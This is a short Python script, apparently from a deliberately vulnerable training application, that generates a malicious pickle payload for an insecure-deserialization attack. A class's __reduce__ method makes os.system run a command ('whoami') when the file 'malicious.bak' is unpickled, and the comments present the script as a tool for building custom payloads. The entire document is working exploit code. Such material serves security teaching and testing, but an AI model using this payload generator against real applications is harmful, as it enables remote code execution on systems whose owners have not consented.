# The included malicious payloads for both Windows and Linux will execute a terminal with scrolling green text when uploaded to the application.
# This 'insecure_deserialization.py' script can be used to generate custom payloads.

import pickle
import os

class RCE:
    def __reduce__(self):
        # this will execute the given command when unpickled
        cmd = ('whoami')
        return os.system, (cmd,)
    
with open('malicious.bak', 'wb') as file:
    pickle.dump(RCE(), file)